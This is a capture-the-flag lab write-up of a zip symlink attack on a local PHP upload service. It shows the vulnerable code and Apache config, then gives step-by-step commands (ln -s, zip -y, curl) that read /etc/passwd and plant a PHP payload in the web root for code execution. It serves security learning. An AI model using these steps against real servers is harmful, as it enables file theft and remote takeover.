[Symlink Attack Challenge]
	Target: http://localhost:9091
	
	- Take a look at index.php file, it is a simple code about upload a zipped file
	
	... 
	$dir = $_SESSION['dir'];
    	if ( !file_exists($dir) )
        mkdir($dir);

    	$cmd = '';
    	$error = '';
    	$success = '';
    	$debug = '...';
    	if(isset($_FILES["file"])) {
        try {
            // Fixed: Dont save file to user's directory, only use tmp_name
            // unzip the file
            $name = '/tmp/name';
            move_uploaded_file($_FILES["file"]["tmp_name"], $name);

            $cmd = "unzip " . $name . " -d " . $dir;
            $debug = shell_exec($cmd);

            // Remove /usr/ from directory
            $user_dir = str_replace("/var/www/html", "", $dir);
            $success = 'Successfully uploaded and unzip files into <a href="' . $user_dir . '/">' . $user_dir .'</a>';
        	} catch(Exception $e) {
            		$error = $e->getMessage();
        	}
    	}
    	..
    	
    	- Let look closely in apache2.conf file
    	
    	<Directory />
        Options FollowSymLinks  //symbolic links should be followed
        AllowOverride None    //no directives in .htaccess files will be allowed to override
        Require all denied
	</Directory>
	
	...
	
	RUN echo "CBJS{FAKE_FLAG_FAKE_FLAG}" >> /etc/passwd
	RUN echo "CBJS{FAKE_FLAG_FAKE_FLAG}" >> /secret.txt
	
	=>> do you think we can rce in this lab? let see
	
	- First, make a symlink to cat /etc/passwd file
	
	- I created a symbolic link to /etc/passwd
	khanh@kali:~/Desktop$ ln -s /etc/passwd linktopasswd
	=>> ln is the command to create a link between files, option -s is to create symbolic link (hard link is default behaviour)
	
	khanh@kali:~/Desktop$ zip -y read.zip linktopasswd
  	adding: linktopasswd (stored 0%)
  	
  	=>> zip it to became the link in the target machine
    	
    	-After uploaded zip file 
    	
    	linking: /var/www/html/upload/9e929b91e195f4b559c712320593c818/linktopasswd  -> /etc/passwd 
	finishing deferred symbolic links:
  	/var/www/html/upload/9e929b91e195f4b559c712320593c818/linktopasswd -> /etc/passwd
    	
    	root@cf187cfc479e:/var/www/html/upload/9e929b91e195f4b559c712320593c818# ls -al
	total 8
	drwxr-xr-x 2 www-data www-data 4096 Feb 19 12:08 .
	drwxrwx--T 3 root     www-data 4096 Feb 19 11:06 ..
	lrwxrwxrwx 1 www-data www-data   11 Feb 19 12:08 linktopasswd -> /etc/passwd

	=>> Get the content of /etc/passwd file
	=>> curl localhost:9091/upload/9e929b91e195f4b559c712320593c818/linktopasswd
	
	root:x:0:0:root:/root:/bin/bash
                daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
                bin:x:2:2:bin:/bin:/usr/sbin/nologin
                ...
                gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
                nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
                _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
                CBJS{FAKE_FLAG_FAKE_FLAG}
                
                
        *** Get RCE
        
        - Do you remember this conf 
	
	<Directory "/var/www/html/upload/">
        AllowOverride None
        Require all granted
        Options +Indexes
	</Directory>
	
	<Directory ~ "^/var/www/html/upload/[0-9a-fA-F]{32}/.+">
        AllowOverride None
        Require all granted
        <FilesMatch ".*">
                SetHandler None
        </FilesMatch>

        Header set Content-Type application/octet-stream

        <FilesMatch ".+\.jpg$">
                Header set Content-Type image/jpeg
        </FilesMatch>
        <FilesMatch ".+\.png$">
                Header set Content-Type image/png
        </FilesMatch>
        <FilesMatch ".+\.(html|txt|php)">
                Header set Content-Type text/plain
        </FilesMatch>
	</Directory>

	=>> Yah we can not do any things in /var/www/html/upload/, we will work in /var/www/html/ right =))
	
	-Now, create a symlink to /var/www/html/
	
	khanh@kali:~/Desktop$ ln -s /var/www/html/ linktohtml
	khanh@kali:~/Desktop$ zip -y linktohtml.zip linktohtml
  	adding: linktohtml (stored 0%)
  	
  	finishing deferred symbolic links:
  	/var/www/html/upload/9e929b91e195f4b559c712320593c818/linktohtml -> /var/www/html/
  	
  	=>> But, how can we upload the payload to /var/www/html/ 
  	=>> We will use a recurse trick 
  	
  	- Let touch a new directory named linktohtml and touch a simple php payload in linktohtml directory /linktohtml/payload.php
	
	khanh@kali:~/Desktop/New Folder$ ls
	linktohtml
	khanh@kali:~/Desktop/New Folder$ zip -r rce.zip linktohtml/payload.php
  	adding: linktohtml/payload.php (stored 0%)
	
	=>> /var/www/html/upload/9e929b91e195f4b559c712320593c818/linktohtml/payload.php
	
	FINAL RESULT: RCE curl http://localhost:9091/payload.php => www-data
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
